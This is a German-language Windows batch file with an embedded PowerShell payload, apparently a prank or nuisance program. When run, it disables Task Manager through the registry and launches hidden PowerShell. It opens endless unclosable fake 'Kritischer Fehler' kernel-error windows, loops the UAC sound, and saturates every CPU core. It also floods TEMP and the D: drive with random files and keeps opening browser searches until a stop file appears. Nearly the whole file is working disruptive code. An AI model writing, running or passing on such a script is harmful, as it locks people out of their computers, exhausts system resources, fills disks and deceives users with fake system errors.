@echo off
title SYSTEM BREACH DETECTED - LESE DAS HIER
color 0C
cls
echo ==========================================
echo !!! WARNUNG: EXTREMER LAG !!!
echo ==========================================
echo.
echo UM ALLES ZU STOPPEN:
echo 1. Druecke Win + R
echo 2. Tippe exakt das ein:
echo    cmd /c echo ^> %%TEMP%%\systemshow.stop
echo 3. Druecke Enter.
echo.
echo Starte Payload in 3 Sekunden...
timeout /t 3 >nul

:: SICHERER EXTRAKTIONS-TRICK (umgeht findstr und Sonderzeichen)
set "PS1=%TEMP%\fry_main.ps1"
powershell -NoProfile -Command "$c = Get-Content '%~f0'; $i = $c.IndexOf('# START_PS'); if($i -ge 0){ $c[($i+1)..($c.Length-1)] | Out-File -Encoding ASCII '%PS1%' }"

:: Startet das Skript unsichtbar
start "" /b powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%"

echo.
echo Payload laeuft! Die VM wird jetzt einfrieren.
echo Nutze den Win+R Trick oben, um sauber zu beenden.

:wait
if exist "%TEMP%\systemshow.stop" goto cleanup
ping -n 2 127.0.0.1 >nul
goto wait

:cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f >nul 2>&1
taskkill /f /im powershell.exe >nul 2>&1
del /f /q "%TEMP%\systemshow.stop" >nul 2>&1
echo.
echo Alles gestoppt. Task-Manager wieder aktiv.
pause
exit

# START_PS
$stop = "$env:TEMP\systemshow.stop"
if (Test-Path $stop) { Remove-Item $stop -Force }

# 1. Task-Manager blockieren (Strg+Shift+Esc tot)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force

# 2. GUI-Skript vorbereiten (Unschließbar & Alt+F4 blockiert)
$guiPath = "$env:TEMP\gui_error.ps1"
$guiCode = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$f = New-Object System.Windows.Forms.Form
$f.Text = "Microsoft Windows - Kritischer Fehler"
$f.ControlBox = $false
$f.TopMost = $true
$f.FormBorderStyle = "FixedDialog"
$f.StartPosition = "CenterScreen"
$f.BackColor = "White"
$f.Width = 450
$f.Height = 200
$f.Add_FormClosing({ $_.Cancel = $true })
$l = New-Object System.Windows.Forms.Label
$l.Text = "Windows Error: 0x" + (Get-Random) + "`n`nKernel-Speicherzugriffsverletzung. Das System wird heruntergefahren."
$l.AutoSize = $true
$l.Location = New-Object System.Drawing.Point(20, 20)
$l.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$f.Controls.Add($l)
$f.ShowDialog()
'@
Set-Content -Path $guiPath -Value $guiCode -Force

# 3. Sound-Spam (6x parallel, ohne Pause)
for ($i=0; $i -lt 6; $i++) {
    Start-Job -ScriptBlock {
        $p = New-Object System.Media.SoundPlayer "C:\Windows\Media\Windows User Account Control.wav"
        while (-not (Test-Path "$env:TEMP\systemshow.stop")) { $p.PlaySync() }
    } | Out-Null
}

# 4. CPU-Bombe (Maximale Auslastung)
$cpus = [Environment]::ProcessorCount * 2
for ($i=0; $i -lt $cpus; $i++) {
    Start-Job -ScriptBlock {
        while (-not (Test-Path "$env:TEMP\systemshow.stop")) { $a = [math]::Sqrt(12345) }
    } | Out-Null
}

# 5. Datei-Spam (100 Mio Dateien auf C: und D:)
$dirs = @("$env:TEMP\ddww")
if (Test-Path "D:\") { $dirs += "D:\ddww" }
foreach ($d in $dirs) { 
    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null } 
}
foreach ($d in $dirs) {
    for ($j=0; $j -lt 10; $j++) {
        Start-Job -ScriptBlock {
            param($dir, $stop)
            $r = [System.Random]::new()
            while (-not (Test-Path $stop)) {
                $len = $r.Next(3, 51)
                $buf = New-Object byte[] $len
                $r.NextBytes($buf)
                try { [System.IO.File]::WriteAllBytes((Join-Path $dir ("f_" + [guid]::NewGuid().ToString() + ".bin")), $buf) } catch {}
            }
        } -ArgumentList $d, $stop | Out-Null
    }
}

# 6. Haupt-Loop: GUI Spam + Website Spam
$sites = @("https://www.bing.com/search?q=", "https://www.google.com/search?q=", "https://www.youtube.com/results?search_query=")
while (-not (Test-Path $stop)) {
    # 2 Fehlerfenster pro Sekunde (unschließbar)
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -STA -File `"$guiPath`""
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -STA -File `"$guiPath`""
    
    # Webseite im Browser öffnen
    $rSite = $sites[(Get-Random -Maximum $sites.Length)]
    $rWord = (Get-Random -Minimum 10000 -Maximum 99999)
    Start-Process ($rSite + $rWord)
    
    Start-Sleep -Milliseconds 500
}